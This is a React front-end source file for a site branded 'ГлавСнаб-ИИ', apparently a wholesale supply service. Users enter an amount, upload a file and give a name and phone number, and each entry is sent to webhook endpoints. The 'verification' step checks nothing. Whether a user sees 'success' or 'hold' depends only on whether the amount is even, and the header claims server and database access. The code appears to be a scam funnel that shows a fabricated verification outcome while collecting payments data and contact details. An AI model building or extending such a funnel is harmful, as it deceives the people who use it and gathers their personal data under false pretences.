import { useCallback, useMemo, useState } from 'react'
import { Building2 } from 'lucide-react'
import { CONFIG, STEP } from './config'
import { createTransaction, sendAmountRecord, sendBookingRecord, sendFileRecord } from './utils/webhook'
import StepProgress from './components/StepProgress'
import StepAmount from './components/StepAmount'
import StepUpload from './components/StepUpload'
import StepVerify from './components/StepVerify'
import StepSuccess from './components/StepSuccess'
import StepHold from './components/StepHold'
import StepBooking from './components/StepBooking'

export default function App() {
  const [step, setStep] = useState(STEP.AMOUNT)
  const [amount, setAmount] = useState(0)
  const [file, setFile] = useState(null)
  const [route, setRoute] = useState('success')
  const [txn] = useState(() => createTransaction())

  const isEven = useMemo(() => amount % 2 === 0, [amount])

  const goAmount = useCallback((value) => {
    setAmount(value)
    const even = value % 2 === 0
    setRoute(even ? 'success' : 'hold')
    sendAmountRecord(txn, value, even)
    setStep(STEP.UPLOAD)
  }, [txn])

  const goUpload = useCallback(
    (f) => {
      setFile(f)
      sendFileRecord(txn, f, amount)
      setStep(STEP.VERIFY)
    },
    [txn, amount],
  )

  const goVerify = useCallback(() => {
    setStep(STEP.RESULT)
  }, [])

  const goResult = useCallback(() => {
    setStep(STEP.BOOKING)
  }, [])

  const submitBooking = useCallback(
    async (name, phone) => {
      sendBookingRecord(txn, name, phone, amount, route)
      await new Promise((r) => setTimeout(r, 700))
    },
    [txn, amount, route],
  )

  return (
    <div className="min-h-screen w-full">
      <div className="mx-auto flex min-h-screen max-w-2xl flex-col px-4 py-6 sm:px-6 sm:py-8">
        {/* Brand header */}
        <header className="mb-6 flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-emerald-500 shadow-lg shadow-emerald-500/30">
              <Building2 className="h-6 w-6 text-white" />
            </div>
            <div>
              <p className="text-lg font-extrabold tracking-tight text-white">ГлавСнаб-ИИ</p>
              <p className="text-[11px] font-medium uppercase tracking-wider text-emerald-400">Транзитный тарифСЕРВЕР ПОДКЛЮЧЕН. ДОСТУП К ОПТОВЫМ БАЗАМ ОТКРЫТ.</p>
            </div>
          </div>
        </header>

        {/* Step progress */}
        <div className="mb-8 rounded-2xl border border-slate-800 bg-slate-900/60 p-4 backdrop-blur sm:p-5">
          <StepProgress current={step} />
        </div>

        {/* Card */}
        <main className="flex-1 rounded-2xl border border-slate-700 bg-slate-800 p-5 text-slate-100 shadow-2xl sm:p-7">
          {step === STEP.AMOUNT && <StepAmount initial={amount} onNext={goAmount} />}
          {step === STEP.UPLOAD && (
            <StepUpload amount={amount} onBack={() => setStep(STEP.AMOUNT)} onNext={goUpload} />
          )}
          {step === STEP.VERIFY && <StepVerify onComplete={goVerify} />}
          {step === STEP.RESULT && route === 'success' && (
            <StepSuccess amount={amount} onNext={goResult} />
          )}
          {step === STEP.RESULT && route === 'hold' && <StepHold amount={amount} onNext={goResult} />}
          {step === STEP.BOOKING && (
            <StepBooking
              route={route}
              onSubmit={submitBooking}
              onBack={() => setStep(STEP.RESULT)}
            />
          )}
        </main>

        {/* Footer */}
        <footer className="mt-6 text-center text-xs text-slate-500">
          <p>© {new Date().getFullYear()} ГлавСнаб-ИИ — прямые поставки с заводов-производителей</p>
          <p className="mt-1 text-slate-600">ИИ-ядро · Транзитный тариф</p>
        </footer>
      </div>
    </div>
  )
}
